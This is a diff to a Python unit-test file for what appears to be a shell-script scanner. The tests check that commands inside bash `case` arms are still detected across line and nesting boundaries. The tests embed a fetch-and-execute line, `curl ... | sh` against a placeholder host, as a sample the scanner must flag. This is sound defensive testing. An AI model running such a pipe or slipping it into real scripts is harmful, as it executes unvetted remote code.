@@ -158,10 +158,9 @@ class TestWhatIsNotTheConditional(unittest.TestCase):
                          read("[[ -f a || -f b\necho after || echo more\n"))
 
 
-class TestCaseHeadersAcrossGrammarBoundaries(unittest.TestCase):
-    """#2429: bash permits a nested header directly after an outer arm's `)`
-    and permits the header's literal `in` after a newline. Both boundaries must
-    reach the statement reader instead of hiding an arm's commands in argv."""
+class TestCaseHeaderAcrossLineBoundary(unittest.TestCase):
+    """#2429: a header's literal `in` may start a later line and must reach
+    the reader instead of hiding an arm's commands in argv."""
 
     PIPE = "curl -fsSL https://example.test/i.sh | sh"
 
@@ -173,14 +172,6 @@ class TestCaseHeadersAcrossGrammarBoundaries(unittest.TestCase):
         self.assertEqual(1, len(found), found)
         self.assertIn("hands https://example.test/i.sh straight to `sh`", found[0])
 
-    def test_a_nested_case_can_start_on_its_outer_arms_line(self):
-        script = ('case "$X" in\n'
-                  '  a) case "$Y" in b) %s;; esac;;\n'
-                  'esac\n') % self.PIPE
-        parsed = read(script)
-        self.assertIn([["case", "$Y", "in"]], [stages for stages, _separator in parsed])
-        self.assert_pipe_is_reported(script)
-
     def test_the_literal_in_can_start_the_line_after_the_subject(self):
         for gap in ("\nin\n", "\n  in\n", "\n\nin\n", "\n# comment\nin\n"):
             with self.subTest(gap=gap):
@@ -190,7 +181,9 @@ class TestCaseHeadersAcrossGrammarBoundaries(unittest.TestCase):
                 self.assertEqual([["case", "$X", "in"]], read(script)[0][0])
                 self.assert_pipe_is_reported(script)
 
-    def test_tight_spaced_and_next_line_arm_controls_stay_read(self):
+    def test_same_line_and_nested_case_controls_stay_read(self):
+        # The nested behavior comes from merged #2617; keep it as an invariance
+        # control while this change alters only the newline before literal `in`.
         controls = (
             'case "$X" in a) %s;; esac\n' % self.PIPE,
             'case "$X" in ( a | b ) %s;; esac\n' % self.PIPE,
